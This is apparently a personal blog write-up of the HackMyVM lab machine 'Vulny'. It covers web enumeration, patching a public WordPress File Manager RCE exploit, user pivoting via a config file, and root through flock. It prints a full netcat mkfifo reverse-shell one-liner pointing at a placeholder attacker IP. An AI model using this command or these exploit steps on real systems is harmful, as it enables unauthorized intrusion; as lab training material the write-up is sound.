+++
title = 'Vulny - Hackmyvm'
date = 2024-01-20T14:47:53-06:00
draft = false
summary = "Writeup of the machine vulny from the hackmyvm website"
tags = ["pentesting","hackmyvm"]
+++

# Machine Information
***
| Name  | Vulny  |
|---|---|
|  OS | Linux  |
|Author   |SML   |
|Difficulty   |Easy   |
|Site   |[hackmyvm](https://hackmyvm.eu)   |
***

## Recon and enumeration

Service scan:

![](/hackmyvm/easy/vulny/vulny%20(1).png)

Lets check the webpage:

![](/hackmyvm/easy/vulny/vulny%20(2).png)

Default apache2 webpage, we run a gobuster scan.

![](/hackmyvm/easy/vulny/vulny%20(3).png)

We find two interesting directories, javascript and secret, let's check them:

![](/hackmyvm/easy/vulny/vulny%20(4).png)

We find something interesting, maybe, that's the directory we are in right now, so let's keep that in mind, in the javascript page we dont have enough privileges to view it:

![](/hackmyvm/easy/vulny/vulny%20(5).png)

Let's enumerate the /secret directory:

![](/hackmyvm/easy/vulny/vulny%20(6).png)

We find another 3 directories , lets secret each one of them:

![](/hackmyvm/easy/vulny/vulny%20(7).png)

***
![](/hackmyvm/easy/vulny/vulny%20(8).png)

![](/hackmyvm/easy/vulny/vulny%20(9).png)

*Later on, I found this directories on the /wp-admin directories, but could'nt access them*
***

![](/hackmyvm/easy/vulny/vulny%20(10).png)

Lets check the /uploads directory in /wp-content:

![](/hackmyvm/easy/vulny/vulny%20(11).png)

We find a zip-file, lets download it and see its contents:

![](/hackmyvm/easy/vulny/vulny%20(12).png)

Among the files of the zip, se file an sql file, we research how to open it:

![](/hackmyvm/easy/vulny/vulny%20(13).png)
![](/hackmyvm/easy/vulny/vulny%20(14).png)

Lets follow this steps, we find nothing of interest in the database tables:(make sure we start the mysql service with `sudo service start mysql`)

![](/hackmyvm/easy/vulny/vulny%20(15).png)

Apparently, this database has no information at all, ideally , it would have user and password information, I decide to do a little bit of research on the wp file manager and it's version to see if it can be exploited in some way.

After a while, a find a [github](https://github.com/ircashem/wp-file-manager-plugin-exploit) page, containing a exploit for this app, it a plugin for wordpress, and the exploit will a allow remote command execution, now I'll follow this steps, and see if I can get a reverse shell:

I get an error code:

![](/hackmyvm/easy/vulny/vulny%20(16).png)

Lets check the code and see what's the problem:

![](/hackmyvm/easy/vulny/vulny%20(17).png)

We can see, that the default directory I will look up will start with `/wp-content` ,but, let's remember our directory enumeration, the `/wp-content` directory is in the `/secret` directory:

![](/hackmyvm/easy/vulny/vulny%20(18).png)

Also, just for the sake of confirmation, lets check the content of the zip file we downloaded and see if the `readme.txt` is there:

![](/hackmyvm/easy/vulny/vulny%20(19).png)

There it is, so, now ,to make the code work, we just need to add the `/secret` string to the variable, like this:

![](/hackmyvm/easy/vulny/vulny%20(20).png)

It should work now, lets try again:

![](/hackmyvm/easy/vulny/vulny%20(21).png)

We find another error, but this time, in my opinion, the programmers part, didn't it say that 6.0 was also vulnerable?

![](/hackmyvm/easy/vulny/vulny%20(22).png)

It is, lets check the code again:

![](/hackmyvm/easy/vulny/vulny%20(23).png)

We found the problem, now, what's happening here, to sum it up, the `>` operator *greater than* is causing the problem, because of this, instead of looking through version `6.0 to 6.8` it will only detect version through `6.1 to 6.8` as vulnerable ,leaving out the `6.0` of the app, let add an `=` next to the `>` , to take in count the `6.0`  and then let's try out the code again:

![](/hackmyvm/easy/vulny/vulny%20(24).png)

After looking at the code a while, I realize, there are another strings referencing the directory that I did not change:

![](/hackmyvm/easy/vulny/vulny%20(25).png)

## Initial access and user pivoting
Now, lets run the exploit again:

![](/hackmyvm/easy/vulny/vulny%20(26).png)

There we go! Lets see what we can find:

![](/hackmyvm/easy/vulny/vulny%20(27).png)

First, we find the user adrian, lets see if we can access his home folder, it seems we cannot traverse directories, let try that reverse shell we saw earlier on the github page of the exploit:

First we start our listener in our machine :

![](/hackmyvm/easy/vulny/vulny%20(28).png)

Then we run the `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <YOUR-MACHINE-IP> <PORT-OF-YOUR-CHOOSING> >/tmp/f ` on the target machine:

![](/hackmyvm/easy/vulny/vulny%20(29).png)


![](/hackmyvm/easy/vulny/vulny%20(30).png)
We have a reverse shell! Lets update our shell a little:

![](/hackmyvm/easy/vulny/vulny%20(31).png)

Using the following, remember that we have to run a `bash shell` for this to work, which, in my case I need to do because I'm using zsh, I run the command, and explore ,first, I look for other users:

![](/hackmyvm/easy/vulny/vulny%20(32).png)

Besides root, only the user *adrian* can use a shell session, lets go to his home directory and check its contents:

![](/hackmyvm/easy/vulny/vulny%20(33).png)

We can't access anything interesting in this directory, but now we know we have to pivot to this user, lets check if theres something of interest ing the `/var/www/` directory:

![](/hackmyvm/easy/vulny/vulny%20(34).png)

Nothing there...

I decide explore the contents of the wordpress directory, there I find some interesting files:

![](/hackmyvm/easy/vulny/vulny%20(35).png)

I inspect the contents of that php file:

![](/hackmyvm/easy/vulny/vulny%20(36).png)

Lets try that:

![](/hackmyvm/easy/vulny/vulny%20(37).png)

Great! Now lets get that user flag:

![](/hackmyvm/easy/vulny/vulny%20(38).png)

## Privilege Escalation
Now, lets run the usual commands to check if we can find any privesc vectors:

![](/hackmyvm/easy/vulny/vulny%20(39).png)

We search that program in [gtfobins](https://gtfobins.github.io/gtfobins/flock/)

![](/hackmyvm/easy/vulny/vulny%20(40).png)

We try this, and see if we can access the contents of the /root directory:

![](/hackmyvm/easy/vulny/vulny%20(41).png)

Even better, we get root! Lets see if we can get that flag:

![](/hackmyvm/easy/vulny/vulny%20(42).png)

And we have pwned the machine.

## Thing I learned from this machine

- Wordpress vulnerabililty in versions ranging from (6.0 to 6.8)
- How to access a database I downloaded from a file server with mysql(and that not always those databases will have data on them...)
- Remember the start a bash shell when getting a full TTY(if not using bash a main shell session)
- Check config files for useful information
- Apparently, after checking other writeups, I could've use the metasploit framework too for this machine.